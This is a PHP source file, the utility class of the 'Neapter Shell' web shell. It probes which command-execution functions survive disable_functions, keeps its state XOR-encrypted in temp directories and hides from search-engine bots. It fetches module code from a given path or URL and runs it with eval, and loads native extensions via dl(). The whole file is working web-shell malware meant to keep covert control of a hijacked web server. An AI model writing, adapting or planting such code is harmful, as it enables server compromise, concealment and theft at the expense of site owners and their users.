<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Very usefull operations
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 * @link    http://www.php.net/manual/en/class.recursivedirectoryiterator.php#101654
 */
class Utils
{
    /**
     * Get temporary directory path
     *
     * @return string
     */
    public function getTmpDir()
    {
        $aTmpDirs = array(
            @ $_ENV['TMP'],
            @ $_ENV['TEMP'],
            ini_get('session.save_path'),
            ini_get('upload_tmp_dir'),
            ini_get('soap.wsdl_cache_dir'),
            sys_get_temp_dir(),
            '/tmp'
        );

        $aTmpDirs = array_unique($aTmpDirs);

        foreach ($aTmpDirs as $sTmpDir) {
            if (is_readable($sTmpDir) && is_writable($sTmpDir)) {
                return $sTmpDir;
            }
        }

        return null;
    }

    /**
     * Simple XOR encryption
     *
     * @param  string $sData Message
     * @param  string $sKey  [Optional] Use key
     * @return string        encrypted string
     */
    public function encrypt($sData, $sKey = '')
    {
        /**
         * Domyslny klucz
         */
        if (!$sKey) {
            $sKey = $this->getEncryptionKey();
        }

        if (($iDataLen = strlen($sData)) === 0) {
            return '';
        }

        $iKeyLen = strlen($sKey);
        $sNewData = '';

        for ($i = 0; $i < $iDataLen; ++$i) {
            $sNewData .= chr(
                ord(substr($sData, $i, 1)) ^ ord($sKey[$i % $iKeyLen])
            );
        }

        return $sNewData;
    }

    /**
     * XOR Decryption
     *
     * @param  string $sData Message
     * @param  string $sKey  [Optional] Use key
     * @return string        decrypted string
     */
    public function decrypt($sData, $sKey = '')
    {
        return $this->encrypt($sData, $sKey);
    }

    /**
     * Get port number. If port is incorrect, 0 returns
     *
     * @param  integer $iPort Port number
     * @return integer
     */
    public function getPort($iPort)
    {
        if (!ctype_digit((string) $iPort)) {
            return 0;
        }

        $iPort = (int) $iPort;

        if ($iPort < 0 || $iPort > 65535) {
            return 0;
        }

        return $iPort;
    }

    /**
     * Get hostname and port. If port is incorrect, function returns empty array
     *
     * @param string $sHost hostname:port
     * @return array
     */
    public function getHostPort($sHost)
    {
        $sHost = trim($sHost);

        if (strpos($sHost, ':') === false) {
            return array();
        }

        list($sHost, $iPort) = explode(':', $sHost);

        if (0 === $iPort = $this->getPort($iPort)) {
            return array();
        }

        return array($sHost, $iPort);
    }

    /**
     * Neapter shell is running on Windows?
     *
     * @return bool
     */
    public function isWindows()
    {
        return (strncmp(PHP_OS, 'WIN', 3) === 0);
    }

    /**
     * PHP safe_mode has been enabled?
     *
     * @return bool
     */
    public function isSafeMode()
    {
        return (bool) ini_get('safe_mode');
    }

    /**
     * Is it possible to execute shell command?
     *
     * @return bool
     */
    public function isExecutable()
    {
        if ($this->isSafeMode()) {
            return false;
        }

        $aDiff = array_diff(
            $this->getSystemFunctions(),
            $this->getDisabledFunctions()
        );

        return (count($aDiff) > 0);
    }

    /**
     * Get array of all disabled functions
     *
     * @return array
     */
    public function getDisabledFunctions()
    {
        $aDisableFunctions = array();

        if (($sDisableFunctions = ini_get('disable_functions')) !== '') {
            $aDisableFunctions = explode(',', $sDisableFunctions);

            $aDisableFunctions = array_map(
                create_function(
                    '$sValue',
                    'return strtolower(trim($sValue));'
                ),
                $aDisableFunctions
            );
        }

        return $aDisableFunctions;
    }

    /**
     * Get list of PHP functions to execute shell command
     *
     * @return array
     */
    public function getSystemFunctions()
    {
        $aSystemFunctions = array(
            'exec',
            'shell_exec',
            'passthru',
            'system',
            'popen',
            'proc_open'
        );

        if (function_exists('pcntl_exec')) {
            $aSystemFunctions[] = 'pcntl_exec';
        }

        return $aSystemFunctions;
    }

    /**
     * Block all bots, spiders etc. Check if useragent is bot
     *
     * @param  string $sUserAgent Full User-Agent
     * @return bool
     */
    public function isUserAgentOnBlacklist($sUserAgent)
    {
        $aUserAgents = array(
            'bot',
            'yahoo',
            'spider'
        );

        foreach ($aUserAgents as $sUA) {
            if (stripos($sUserAgent, $sUA) !== false) {
                return true;
            }
        }

        return false;
    }

    /**
     * Get all commands assigned to module (class name)
     *
     * @param  string $sModule Module name (Class name)
     * @return array           List of commands
     */
    public function getCommandsByModule($sModule)
    {
        $aCommands = array();

        foreach ($this->getCommands() as $sCmd => $sClass) {
            if ($sClass === $sModule) {
                $aCommands[] = $sCmd;
            }
        }

        return $aCommands;
    }

    /**
     * Get list of all commands
     *
     * @example array(
     *     'mv' => ModuleMv
     *     'move' => ModuleMv
     * )
     * @return  array
     */
    public function getCommands()
    {
        $aModules = array();

        $aClasses = get_declared_classes();

        foreach ($aClasses as $sClass) {
            if ((strncmp($sClass, 'Module', 6) === 0)
                && ($sClass !== 'ModuleDummy')
                && ($sClass !== 'ModuleAbstract')
            ) {
                /**
                 * @todo, Reflection class since PHP 5.3, I should find
                 * another way to use PHP 5.2.X
                 */
                $oReflection = new ReflectionClass($sClass);

                if ($oReflection->isSubclassOf('ModuleAbstract')) {
                    $aCommands = $sClass::getCommands();

                    foreach ($aCommands as $sCommand) {
                        $aModules[$sCommand] = $sClass;
                    }
                }
            }
        }

        return $aModules;
    }

    /**
     * Get all modules (Classes names)
     *
     * @return array
     */
    public function getModules()
    {
        return array_unique(array_values($this->getCommands()));
    }

    /**
     * Unique key to encrypt data
     *
     * @return string
     */
    public function getEncryptionKey()
    {
        return sha1(Request::getServer('PATH'), true);
    }

    /**
     * Get prefix for all cache data
     *
     * @return string
     */
    public function getUniquePrefix()
    {
        return substr(sha1(Request::getServer('SCRIPT_NAME')), 0, 10) . '_';
    }

    /**
     * Location of temporary file
     *
     * @param string $sKey Cache identifier
     *
     * @return string
     */
    public function cacheGetFile($sKey)
    {
        return $this->getTmpDir() . '/' . $this->getUniquePrefix() . md5($sKey);
    }

    /**
     * Get data stored in cache by key name
     *
     * @param  string $sKey Jey bane
     * @return mixed
     */
    public function cacheGet($sKey)
    {
        $sFile = $this->cacheGetFile($sKey);

        if (is_file($sFile) && is_readable($sFile)
            && (($sData = file_get_contents($sFile)) !== false)
        ) {
            $sData = $this->decrypt($sData);

            if (substr($sData, 0, 14) === 'NeaPt3R-SHeLl_') {
                return unserialize(substr($sData, 14));
            }
        }

        return false;
    }

    /**
     * Remove all cache data
     */
    public function cacheFlush()
    {
        $sPath = $this->getTmpDir() . '/' . $this->getUniquePrefix() . '*';

        foreach (glob($sPath) as $sFile) {
            @unlink($sFile);
        }
    }

    /**
     * Remove data from cache by key
     *
     * @param  string $sKey Key name
     * @return bool
     */
    public function cacheDel($sKey)
    {
        $sFile = $this->cacheGetFile($sKey);

        if (!is_file($sFile)) {
            return true;
        }

        return (bool) @unlink($sFile);
    }

    /**
     * Put data into cache
     *
     * @param  string $sKey   Key name
     * @param  mixed  $mValue Data to store
     * @return bool
     */
    public function cacheSet($sKey, $mValue)
    {
        $sFile = $this->cacheGetFile($sKey);

        $sValue = 'NeaPt3R-SHeLl_' . serialize($mValue);

        return (bool) @ file_put_contents($sFile, $this->encrypt($sValue));
    }

    /**
     * Based on IP and User-Agent get unique key name for authentication
     *
     * @return string
     */
    public function getAuthFileKey()
    {
        return md5(Request::getServer('REMOTE_ADDR') . Request::getServer('USER_AGENT')) . '_auth';
    }

    /**
     * Load Neapter Shell modules and put it in cache
     *
     * @param  string $sPath Full path to file with modules
     * @return bool
     */
    public function loadModuleFromLocation($sPath)
    {
        if (($sData = @file_get_contents($sPath)) === false) {
            return false;
        }

        $this->cacheSet('modules', $sData);

        return $this->loadModules();
    }

    /**
     * Remove all cached modules
     *
     * @return bool
     */
    public function removeLoadedModules()
    {
        return $this->cacheDel('modules');
    }

    /**
     * Wczytanie rozszerzenia
     *
     * @access public
     * @param  string $sExtension Nazwa rozszerzenia lub sciezka do pliku
     * @return boolean            True w przypadku pomyslnego zaladowania
     */
    public function dl($sExtension)
    {
        $sName = basename($sExtension);

        if (($iPos = strrpos($sName, '.')) !== false) {
            $sName = substr($sName, 0, $iPos - 1);
        } else {
            $sExtension .= ($this->isWindows() ? '.dll' : '.so');
        }

        if (extension_loaded($sName)) {
            return true;
        }

        /**
         * Aby `dl` dzialalo poprawnie wymagane jest wylaczone safe_mode,
         * wlaczenie dyrektywy enable_dl. Funkcja `dl` musi istniec
         * i nie moze znajdowac sie na liscie wylaczonych funkcji
         */
        if (!$this->isSafeMode() && ini_get('enable_dl')
            && !in_array('dl', $this->getDisabledFunctions())
            && function_exists('dl')
        ) {
            return @dl($sExtension);
        }

        return false;
    }

    /**
     * Load modules from cache file
     *
     * @return bool
     */
    public function loadModules()
    {
        if (false === $sData = $this->cacheGet('modules')) {
            return false;
        }

        ob_start();
        eval('?>' . $sData . '<?');
        ob_clean();
        ob_end_flush();

        return true;
    }

    /**
     * Autoload extensions from cache file
     */
    public function autoloadExtensions()
    {
        if (false === $aAutoload = $this->cacheGet('autoload')) {
            return ;
        }

        foreach ($aAutoload as $sExtension) {
            if (extension_loaded($sExtension)) {
                continue;
            }

            $this->dl($sExtension);
        }
    }

    /**
     * Add extension to autoload
     *
     * @param  array $aMod Name of module
     * @return bool
     */
    public function autoloadExtensionsAdd(array $aMod)
    {
        if (false === $aModules = $this->cacheGet('autoload')) {
            $aModules = array();
        }

        foreach ($aMod as $sExtension) {
            if (in_array($sExtension, $aModules)) {
                continue;
            }

            $this->dl($sExtension);
        }

        $aModules = array_unique($aModules + $aMod);

        return $this->cacheSet('autoload', $aModules);
    }

    /**
     * Get list of all autoloaded extensions
     *
     * @return array
     */
    public function autoloadExtensionsGet()
    {
        if (false === $aModules = $this->cacheGet('autoload')) {
            return array();
        }

        return $aModules;
    }

    /**
     * Get list of all directories in PATH environment variable
     *
     * @return array
     */
    public function getEnvironmentPathes()
    {
        $sIndexPath = '';

        /* Windows contains PATH, windows Path environment file*/
        foreach ($_SERVER as $sKey => $sValue) {
            if (strtolower($sKey) === 'path') {
                $sIndexPath = $sKey;
                break;
            }
        }

        if (!$sIndexPath) {
            return array();
        }

        /* Different separator for OS */
        $sSeparator = $this->isWindows() ? ';' : ':';
        $aPathes = explode($sSeparator, $_SERVER[$sIndexPath]);

        if ($this->isWindows()) {
            $aPathes = array_merge(
                $aPathes,
                array(
                    'C:\\Windows\\system32'
                )
            );
        } else {
            $aPathes = array_merge(
                $aPathes,
                array(
                    '/usr/bin/',
                    '/usr/local/bin/',
                    '/bin',
                    '/usr/local/sbin',
                    '/usr/sbin',
                    '/sbin'
                )
            );
        }

        $aPathes = array_filter($aPathes);
        $aPathes = array_unique($aPathes);
        $aPathes = array_filter($aPathes, 'is_dir');

        return $aPathes;
    }

    /**
     * Get file name of Shell class
     *
     * @return string
     */
    public function getShellFilename()
    {
        $oShell = new ReflectionClass('Shell');

        return $oShell->getFileName();
    }
}
